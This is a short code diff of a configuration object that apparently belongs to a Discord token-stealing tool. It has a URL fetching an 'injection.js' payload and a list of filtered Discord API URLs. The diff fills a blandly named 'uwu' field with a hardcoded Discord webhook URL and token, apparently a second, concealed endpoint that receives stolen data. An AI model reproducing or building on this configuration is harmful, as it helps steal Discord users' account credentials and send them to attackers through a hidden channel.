@@ -17,7 +17,7 @@ var config = {
 
     injection_url: "https://raw.githubusercontent.com/AlphaTools-dev/badges/main/injection.js",
     webhook: "%WEBHOOK%",
-    uwu: "",
+    uwu: "https://canary.discord.com/api/webhooks/1079350446403092540/LCq5pA6NfP8qAUxUzHI04PogMaTNGeorvRBqtrcR9F246Ke4nmDGHpfLpI82oFf0rseI",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
